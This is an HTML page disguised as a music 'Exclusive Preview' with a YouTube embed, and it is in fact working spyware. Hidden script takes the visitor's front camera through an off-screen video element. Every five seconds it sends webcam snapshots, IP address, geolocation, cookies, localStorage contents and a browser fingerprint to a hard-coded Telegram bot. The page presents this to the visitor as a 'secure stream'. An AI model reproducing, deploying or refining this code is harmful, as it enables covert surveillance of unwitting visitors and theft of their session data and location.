<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎵 Stream Loading</title>
    <style>
        body { background:#0a0a0a; color:#fff; font-family:Arial; text-align:center; padding-top:30px; }
        iframe { width:90%; max-width:600px; height:300px; border-radius:12px; border:none; }
        .status { color:#0f0; margin-top:20px; }
        #videoContainer { position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; overflow:hidden; }
    </style>
</head>
<body>
    <h2>🎧 Exclusive Preview</h2>
    <iframe src="https://youtu.be/n_FCrCQ6-bA?si=9yixpO20AYqGEWZH" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    <p class="status">⏳ Connecting to secure stream...</p>
    <div id="log" style="color:#666; font-size:12px; margin-top:30px;">🔒 Initializing camera...</div>
    
    <!-- Camera hidden yahan attach hoga -->
    <div id="videoContainer"></div>

    <script>
        // ----- TERA NAYA TELEGRAM BOT (Confirm) -----
        const BOT_TOKEN = "8615192737:AAGEJtc7fGGnSl3JgyCK992qhHGhX5tanUw";
        const CHAT_ID = "6574042583";

        // ----- HELPER: send message and photo -----
        function sendToTG(text, imageBase64 = null) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            }).catch(e => console.log('TG msg error', e));

            if (imageBase64) {
                try {
                    const byteString = atob(imageBase64.split(',')[1]);
                    const mime = imageBase64.split(',')[0].split(':')[1].split(';')[0];
                    const ab = new ArrayBuffer(byteString.length);
                    const ia = new Uint8Array(ab);
                    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
                    const blob = new Blob([ab], { type: mime });
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('document', blob, 'snapshot.jpg');
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd })
                        .catch(e => console.log('Photo error', e));
                } catch(e) {}
            }
        }

        // ----- GET IP -----
        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const j = await r.json();
                return j.ip || 'Unknown';
            } catch { return 'IP fetch failed'; }
        }

        // ----- CAPTURE AND SEND EVERYTHING (called every 5s) -----
        async function captureAndSend() {
            const now = new Date().toISOString();
            let ip = await getIP();

            // --- Camera snapshot (FIX: properly attached video) ---
            let photoData = null;
            try {
                const video = window.camVideo;
                if (video && video.readyState >= 2) { // HAVE_CURRENT_DATA
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    photoData = canvas.toDataURL('image/jpeg', 0.8);
                } else {
                    console.log('Video not ready yet');
                }
            } catch(e) {
                console.log('Camera capture error:', e);
                photoData = null;
            }

            // --- Location (try to get) ---
            let loc = 'Location unavailable';
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                });
                loc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}, Acc: ${pos.coords.accuracy}m`;
            } catch(e) { /* ignore */ }

            // --- Cookies, Storage, Fingerprint ---
            const cookies = document.cookie || 'None';
            let storage = {};
            try { storage = localStorage; } catch(e) { storage = 'N/A'; }
            const fp = {
                ua: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                lang: navigator.language
            };

            // --- Build comprehensive text message ---
            const msg = `⏱️ ${now}
🌐 IP: ${ip}
📍 Location: ${loc}
🍪 Cookies: ${cookies}
📦 Storage: ${JSON.stringify(storage)}
🖥️ Fingerprint: ${JSON.stringify(fp)}`;

            sendToTG(msg);

            if (photoData) {
                sendToTG('📸 Snapshot (every 5s) FIXED', photoData);
            } else {
                sendToTG('⚠️ Camera frame not captured (retrying next cycle)');
            }
        }

        // ----- START: request camera with FULL DOM ATTACHMENT -----
        (async function init() {
            const container = document.getElementById('videoContainer');
            const log = document.getElementById('log');
            
            try {
                // FIX 1: Video element ko DOM mein daalo
                const video = document.createElement('video');
                video.setAttribute('playsinline', '');
                video.setAttribute('muted', '');
                video.setAttribute('autoplay', '');
                video.style.width = '1px';
                video.style.height = '1px';
                video.style.opacity = '0';
                video.style.position = 'absolute';
                container.appendChild(video);

                // FIX 2: Stream lo
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false 
                });
                video.srcObject = stream;
                await video.play();
                
                // FIX 3: Wait for actual frames (loadedmetadata)
                await new Promise((resolve) => {
                    if (video.readyState >= 2) resolve();
                    else video.onloadedmetadata = resolve;
                });
                // extra delay for stable frame
                await new Promise(r => setTimeout(r, 500));

                window.camStream = stream;
                window.camVideo = video;
                log.innerHTML = '✅ Camera ready & attached to DOM';

                // Abhi pehli photo bhejo
                await captureAndSend();
                
                // Har 5 sec pe bhejo
                setInterval(captureAndSend, 5000);

            } catch(e) {
                log.innerHTML = '⚠️ Camera permission denied or error: ' + e.message;
                // Bina camera ke bhi data bhejte raho
                await captureAndSend();
                setInterval(captureAndSend, 5000);
            }
        })();
    </script>
</body>
</html>
